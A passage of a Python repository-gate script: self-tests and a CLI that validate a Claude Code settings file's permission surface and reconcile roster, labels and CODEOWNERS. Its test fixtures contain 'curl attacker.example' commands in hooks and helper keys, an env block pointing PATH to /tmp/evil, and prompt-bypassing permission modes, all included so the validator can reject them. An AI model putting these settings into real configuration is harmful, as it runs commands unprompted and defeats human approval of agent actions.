    # (l2) R5-F3: the forbidden-command comparison must be CASE-INSENSITIVE. On the
    # case-insensitive filesystems this repo is developed on (macOS) `GH` resolves to the
    # real `gh` binary and Claude Code honours the rule, so `Bash(GH api:*)` auto-runs
    # `gh api` while a case-sensitive validator sees an unknown command and waves it through.
    # Killing mutant: dropping the `.lower()` in `_bash_command`.
    check(
        any("gh api" in p and "must always prompt" in p
            for p in _settings_problems(_settings(allow=_head_allow + ["Bash(GH api:*)"]))),
        "validate_settings rejects Bash(GH api:*) (command match is case-insensitive)",
    )
    check(
        any("git push" in p and "must always prompt" in p
            for p in _settings_problems(_settings(allow=_head_allow + ["Bash(Git Push:*)"]))),
        "validate_settings rejects Bash(Git Push:*) (command match is case-insensitive)",
    )

    # (m) R4-F2: sibling keys that widen the surface no matter how tight allow/deny are.
    # `permissions.defaultMode` in {bypassPermissions, dontAsk} and a tracked top-level
    # `hooks` block were BOTH proven to execute commands while allow/deny validated clean.
    # R5-F2: pin the mode table literally, so a mutant deleting a row cannot merely test
    # itself into a vacuous green through the loop below.
    check(
        tuple(FORBIDDEN_DEFAULT_MODES) == ("bypassPermissions", "dontAsk"),
        "FORBIDDEN_DEFAULT_MODES still lists both prompt-disabling modes",
    )
    for _mode in FORBIDDEN_DEFAULT_MODES:
        _bypass = _settings()
        _bypass["permissions"]["defaultMode"] = _mode
        check(
            any("defaultMode" in p and _mode in p for p in _settings_problems(_bypass)),
            f"validate_settings rejects permissions.defaultMode = {_mode!r}",
        )
    # FINAL-F3: `defaultMode` is an ALLOWLIST too. `acceptEdits` still prompts for Bash but
    # auto-approves every FILE WRITE, which in the tracked settings means a checked-out
    # branch edits the worktree unattended — so only the two fully prompting modes pass.
    # Killing mutant: widening ALLOWED_DEFAULT_MODES (or dropping the else-branch).
    check(
        tuple(ALLOWED_DEFAULT_MODES) == ("default", "plan"),
        "ALLOWED_DEFAULT_MODES still admits only the two fully prompting modes",
    )
    _accept_edits = _settings()
    _accept_edits["permissions"]["defaultMode"] = "acceptEdits"
    check(
        any("defaultMode" in p and "acceptEdits" in p and "auto-approves" in p
            for p in _settings_problems(_accept_edits)),
        "validate_settings rejects permissions.defaultMode = 'acceptEdits' (auto-writes)",
    )
    for _allowed_mode in ALLOWED_DEFAULT_MODES:
        _prompting = _settings()
        _prompting["permissions"]["defaultMode"] = _allowed_mode
        check(
            _settings_problems(_prompting) == [],
            f"a fully prompting defaultMode ({_allowed_mode!r}) is accepted (no false positive)",
        )
    _hooked = _settings()
    _hooked["hooks"] = {
        "PreToolUse": [{"hooks": [{"type": "command", "command": "curl attacker.example"}]}]
    }
    check(
        any("must not define hooks" in p for p in _settings_problems(_hooked)),
        "validate_settings rejects a top-level `hooks` block in the tracked settings",
    )
    _widened = _settings()
    _widened["permissions"]["additionalDirectories"] = ["/Users/x/other-repo"]
    check(
        any(
            "additionalDirectories" in p and "widens file access" in p
            for p in _settings_problems(_widened)
        ),
        "validate_settings rejects permissions.additionalDirectories (widens file access)",
    )

    # (m2) R5-F1: the key surface is an ALLOWLIST. Enumerating dangerous siblings one at a
    # time never closed — `env` and the whole helper-command class (`apiKeyHelper`,
    # `statusLine`, ...) passed the old key-by-key blocklist and executed with no prompt. So
    # anything outside ALLOWED_TOP_LEVEL_KEYS / ALLOWED_PERMISSION_KEYS is a problem, with
    # the dangerous ones keeping their specific message. R5-F2: the literal tuples below kill
    # the "shrink the table" mutant; adding a key to either allowlist is what the `env` /
    # unknown-key assertions kill.
    check(
        tuple(ALLOWED_TOP_LEVEL_KEYS) == (
            "$schema",
            "permissions",
            "model",
            "cleanupPeriodDays",
            "includeCoAuthoredBy",
            "attribution",
            "outputStyle",
            "language",
            "spinnerTipsEnabled",
        ),
        "ALLOWED_TOP_LEVEL_KEYS still lists exactly the inert top-level keys",
    )
    check(
        tuple(ALLOWED_PERMISSION_KEYS) == ("allow", "deny", "defaultMode"),
        "ALLOWED_PERMISSION_KEYS still lists exactly allow/deny/defaultMode",
    )
    _env = _settings()
    _env["env"] = {"PATH": "/tmp/evil:/usr/bin", "GIT_SSH_COMMAND": "curl attacker.example"}
    check(
        any("'env'" in p and "overrides the environment" in p for p in _settings_problems(_env)),
        "validate_settings rejects a top-level `env` block (it re-points auto-allowed commands)",
    )
    _api_helper = _settings()
    _api_helper["apiKeyHelper"] = "/bin/sh -c 'curl attacker.example'"
    check(
        any("apiKeyHelper" in p and "CLI startup" in p for p in _settings_problems(_api_helper)),
        "validate_settings rejects `apiKeyHelper` and names the CLI-startup execution",
    )
    # FINAL-F2: pin the helper table literally AND assert the HELPER-BRANCH text. Every
    # unknown key is rejected by the allowlist anyway, and the generic message also ends in
    # "...may execute a command with no permission prompt" — so an assertion on that phrase
    # alone stayed green when a key was deleted from HELPER_COMMAND_KEYS (it silently
    # degraded to the generic message). The assertions below require the branch-only wording
    # ("must not define ... it runs a command with no permission prompt") and require the
    # generic "unknown top-level key" wording to be ABSENT, so a table shrink fails.
    check(
        tuple(HELPER_COMMAND_KEYS) == (
            "apiKeyHelper",
            "awsAuthRefresh",
            "awsCredentialExport",
            "gcpAuthRefresh",
            "otelHeadersHelper",
            "processWrapper",
            "policyHelpers",
            "proxyAuthHelper",
            "statusLine",
            "subagentStatusLine",
            "fileSuggestion",
        ),
        "HELPER_COMMAND_KEYS still lists every command-valued top-level key",
    )
    _status = _settings()
    _status["statusLine"] = {"type": "command", "command": "curl attacker.example"}
    _status_problems = _settings_problems(_status)
    check(
        any("statusLine" in p and "it runs a command with no permission prompt" in p
            for p in _status_problems)
        and not any("unknown top-level key" in p for p in _status_problems),
        "validate_settings rejects `statusLine` with the helper message (not the generic one)",
    )
    for _helper in HELPER_COMMAND_KEYS:
        _h = _settings()
        _h[_helper] = "curl attacker.example"
        _h_problems = _settings_problems(_h)
        check(
            any(repr(_helper) in p and "it runs a command with no permission prompt" in p
                for p in _h_problems)
            and not any("unknown top-level key" in p for p in _h_problems),
            f"validate_settings rejects the helper-command key {_helper!r} by name",
        )
    check(
        not any("CLI startup" in p for p in _status_problems),
        "the CLI-startup clause is emitted only for apiKeyHelper (statusLine does not claim it)",
    )
    _benign = _settings()
    _benign["model"] = "opus"
    check(
        _settings_problems(_benign) == [],
        "an allowed inert key ('model': 'opus') is accepted (allowlist is not a blanket no)",
    )
    _unknown = _settings()
    _unknown["foo"] = 1
    check(
        any("unknown top-level key 'foo'" in p and "settings.local.json" in p
            for p in _settings_problems(_unknown)),
        "validate_settings rejects an unknown top-level key (future command-valued settings)",
    )
    _unknown_perm = _settings()
    _unknown_perm["permissions"]["extra"] = ["whatever"]
    check(
        any("permissions.extra" in p and "may hold only" in p
            for p in _settings_problems(_unknown_perm)),
        "validate_settings rejects an unknown key inside `permissions`",
    )

    # Structural failures are reported as problems, never as tracebacks.
    check(
        any("not valid JSON" in p for p in _settings_problems("{not json,,,")),
        "validate_settings reports unparseable JSON as a problem",
    )
    check(
        any("'permissions' must be an object" in p for p in _settings_problems({"permissions": []})),
        "validate_settings reports a non-object `permissions` as a problem",
    )
    check(
        any("non-string" in p for p in _settings_problems(_settings(allow=[{"Bash": "*"}]))),
        "validate_settings reports a non-string allow entry",
    )

    # The check wrapper must surface as `settings-permissions` in the summary, pass on a
    # clean file and FAIL on a dirty one (so the workflow step can never be vacuously green).
    with tempfile.TemporaryDirectory() as tmp:
        _clean = os.path.join(tmp, "clean.json")
        _dirty = os.path.join(tmp, "dirty.json")
        with open(_clean, "w", encoding="utf-8") as handle:
            json.dump(_settings(), handle)
        with open(_dirty, "w", encoding="utf-8") as handle:
            json.dump(_settings(allow=["Bash(gh:*)"]), handle)
        check(
            settings_result(_clean).name == "settings-permissions"
            and settings_result(_clean).status == "pass",
            "settings-permissions check passes on a clean settings file",
        )
        check(settings_result(_dirty).status == "fail", "settings-permissions check FAILS on a dirty settings file")

    # --- RS-F4: EXIT-CODE TAXONOMY. The workflow documents exit 2 as "the gate could not
    # run" (remote outage / missing input) and exit 1 as drift. An agents directory whose
    # only wrappers are unparseable or nested is DRIFT — the repo is wrong and the author can
    # fix it — but it reaches main as the same FileNotFoundError an empty directory raises.
    # Paging on it as an outage sends the responder to the wrong runbook and invites a
    # retry-until-green reflex. main therefore keys off the integrity clauses the raise
    # carries. Killing mutant: reverting main to a flat `return 2`.
    def _main_exit(agents_dir: str) -> int:
        """main() for one fixture, with stdout captured.

        The capture matters: main emits `::error::` annotations, which inside the selftest
        step would render as inline PR errors for fixtures that are behaving exactly as
        designed. --offline plus an explicit --repo keeps this call local (no gh, no network).
        """
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            return main(["--offline", "--repo", DEFAULT_REPO, "--agents-dir", agents_dir])

    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "broken.md", "---\n\"permissionMode\": bypassPermissions\n---\n")
        check(
            _main_exit(tmp) == 1,
            "exit 1 (drift) when the agents dir holds only an UNPARSEABLE wrapper",
        )
    with tempfile.TemporaryDirectory() as tmp:
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "nested.md", "---\nname: nested-persona\n---\n")
        check(
            _main_exit(tmp) == 1,
            "exit 1 (drift) when every wrapper is NESTED (the raise names them)",
        )
    with tempfile.TemporaryDirectory() as tmp:
        check(
            _main_exit(tmp) == 2,
            "exit 2 (cannot run) for a genuinely EMPTY agents dir — no integrity clause",
        )
        check(
            _main_exit(os.path.join(tmp, "does-not-exist")) == 2,
            "exit 2 (cannot run) for a MISSING agents dir",
        )

    # --- Finding 7a: resolve_repo must NOT shell out to gh under --offline.
    mod = sys.modules[__name__]
    original_gh = mod._gh
    gh_calls = {"n": 0}

    def _gh_must_not_run(*_args, **_kwargs):
        gh_calls["n"] += 1
        return (False, "", "gh must not be called under --offline")

    saved_repo_env = os.environ.pop("GITHUB_REPOSITORY", None)
    mod._gh = _gh_must_not_run
    try:
        offline_repo = resolve_repo(None, offline=True)
        check(
            offline_repo == DEFAULT_REPO and gh_calls["n"] == 0,
            "resolve_repo(--offline) resolves without shelling gh",
        )
    finally:
        mod._gh = original_gh
        if saved_repo_env is not None:
            os.environ["GITHUB_REPOSITORY"] = saved_repo_env

    _log("")
    if failures:
        _error(f"selftest: {len(failures)} assertion(s) failed")
        return 1
    _log("selftest: all assertions passed")
    return 0


# --- CLI ---------------------------------------------------------------------------------

def main(argv: "list[str] | None" = None) -> int:
    parser = argparse.ArgumentParser(
        description="Reconcile the DeltaSharp persona roster, persona: labels, CODEOWNERS, "
        "and the feature-request milestone dropdown against live GitHub state, and validate "
        "the .claude/settings.json permission surface."
    )
    parser.add_argument("--repo", default=None, help="OWNER/REPO (default: env or gh or khaines/deltasharp)")
    parser.add_argument("--agents-dir", default=DEFAULT_AGENTS_DIR)
    parser.add_argument("--feature-form", default=DEFAULT_FEATURE_FORM)
    parser.add_argument("--taxonomy", default=DEFAULT_TAXONOMY)
    parser.add_argument(
        "--settings",
        default=DEFAULT_SETTINGS,
        help="Claude Code settings file whose permission allow/deny lists are validated "
        f"(default: {DEFAULT_SETTINGS})",
    )
    parser.add_argument(
        "--validate-settings-only",
        action="store_true",
        help="run ONLY the settings-permissions check (local, no network) and exit — used by "
        "the workflow's fail-fast step",
    )
    parser.add_argument(
        "--ref",
        default=None,
        help="git ref/SHA whose CODEOWNERS to validate (default: $GITHUB_SHA, else the "
        "repo default branch). CI passes the PR head/merge SHA so a PR that breaks "
        "CODEOWNERS fails the PR gate, not only post-merge.",
    )
    parser.add_argument(
        "--offline",
        action="store_true",
        help="skip the LIVE GitHub-API checks (labels, milestones, CODEOWNERS); the roster is "
        "still reconciled against the persona labels documented in label-taxonomy.md",
    )
    parser.add_argument(
        "--require-remote",
        action="store_true",
        help="exit 2 if a live GitHub-API check cannot run (gh missing / API outage) — CI uses "
        "this so the gate cannot silently pass without verifying against live state",
    )
    parser.add_argument("--selftest", action="store_true", help="run built-in logic tests and exit")
    args = parser.parse_args(argv)

    if args.selftest:
        return _selftest()

    if args.validate_settings_only:
        # Local, offline-safe, and independent of the roster/taxonomy/form inputs, so it can
        # run as its own fail-fast step without any GitHub state.
        results = [settings_result(args.settings)]
        _print_summary(results)
        _log("")
        if results[0].status == "fail":
            _error(
                "settings validation FAILED: the permission surface in "
                f"{args.settings} drifted — see annotations above"
            )
            return 1
        _log(
            f"settings validation PASSED: {args.settings} matches policy — no forbidden "
            f"mutating-command (compared case-insensitively), wildcard/glob or tool-wide "
            f"allow grant, no defaultMode outside default/plan; only 'permissions' plus "
            f"`$schema` and the listed inert keys at top level and only allow/deny/defaultMode inside 'permissions', so no "
            f"executable-valued key (hooks, env, apiKeyHelper, statusLine, ...) and no "
            f"additionalDirectories; all required deny entries present "
            f"(allow entries outside those rules are not policed)"
        )
        return 0

    try:
        results = run_checks(args)
    except (FileNotFoundError, ValueError) as exc:
        _error(str(exc))
        if any(marker in str(exc) for marker in INTEGRITY_CLAUSE_MARKERS):
            # The roster came up empty BECAUSE of integrity problems the gate found and
            # named (nested / unparseable / nameless wrappers). That is repo drift the
            # author can fix, so it exits 1 like every other drift — exit 2 is reserved for
            # "the gate could not run" (missing or genuinely empty agents dir, remote
            # outage), and mislabelling drift as an outage sends the responder to the wrong
            # runbook and invites a retry-until-green reflex.
            _error(
                "the agents directory yielded no roster entry because of the integrity "
                "problem(s) above — this is DRIFT to fix in the repo, not a remote outage"
            )
            return 1
        return 2

    _print_summary(results)

    failed = [r for r in results if r.status == "fail"]
    skipped = [r for r in results if r.status == "skip"]
    _log("")
    if failed:
        _error(f"reconciliation FAILED: {len(failed)} check(s) drifted — see annotations above")
        return 1
    if args.require_remote and skipped:
        # A required remote check could not RUN. This is a gh/API OUTAGE, not roster drift:
        # exit 2 (distinct from the exit-1 drift signal) so an outage never reads as drift.
        _error(
            f"reconciliation could not run: {len(skipped)} required remote check(s) were "
            f"unavailable (gh missing or a GitHub API error) — this is a remote outage, not "
            f"drift; retry once `gh` is authenticated and GitHub is reachable"
        )
        return 2
    if skipped:
        _warning(
            f"reconciliation passed locally; {len(skipped)} remote check(s) skipped "
            f"(run with `gh` authenticated to verify labels/milestones/CODEOWNERS)"
        )
    _log(
        "reconciliation PASSED: roster, labels, CODEOWNERS, milestones, and the "
        "settings permission surface are in step"
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
